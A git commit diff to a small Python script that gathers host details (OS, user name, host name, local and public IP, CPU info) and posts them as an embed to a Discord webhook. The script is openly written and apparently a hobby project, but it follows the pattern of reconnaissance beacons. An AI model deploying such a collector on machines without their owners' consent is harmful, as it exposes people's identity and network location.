849c354f88380c1bc4ffffe2aa6f56bbaf3b69cd
SuperNinjaCat5 <ben.elliott.2021@gmail.com>
2025-07-22 16:27:30 -0400

    Refactor discord_post function to use embeds for structured system information

--- python_setup/main.py
+++ python_setup/main.py
@@ -4,6 +4,7 @@ import dotenv
 import sys
 import socket
 import platform
+import time
 
 debug = True
 def debug_print(content):
@@ -12,11 +13,11 @@ def debug_print(content):
 
 dotenv.load_dotenv()
 
-def discord_post(content):
-    data = {
-        "content": content
-    }
+def discord_post(embed):
     url = os.getenv("URL")
+    data = {
+        "embeds": [embed]   # embeds must be a list
+    }
     response = requests.post(url, json=data)
     debug_print(f"[Post] to {url}, {response.status_code}")
 
@@ -29,15 +30,19 @@ host_name = socket.gethostname()              #server1, cool-laptop
 local_ip_address = socket.gethostbyname(host_name)
 public_ip_address = requests.get('https://api.ipify.org').text
 
-data = f"""
-Operating System: {operating_system}
-OS Version: {os_version}
-Public IP: {public_ip_address}
-Local IP (LAN): {local_ip_address}
-Current User: {current_user}
-Host Name: {host_name}
-CPU Architecture: {cpu_architecture}
-CPU Core Count: {cpu_core_count}
-"""
+embed = {
+    "title": f"System Information - {host_name}",
+    "color": 0x00ff00,
+    "fields": [
+        {"name": "Operating System", "value": operating_system, "inline": True},
+        {"name": "OS Version", "value": os_version, "inline": True},
+        {"name": "Current User", "value": current_user, "inline": True},
+        {"name": "Host Name", "value": host_name, "inline": True},
+        {"name": "Public IP", "value": public_ip_address, "inline": False},
+        {"name": "Local IP (LAN)", "value": local_ip_address, "inline": False},
+        {"name": "CPU Architecture", "value": cpu_architecture, "inline": True},
+        {"name": "CPU Core Count", "value": str(cpu_core_count), "inline": True},
+    ],
+}
 
-discord_post(data.strip())
+discord_post(embed)
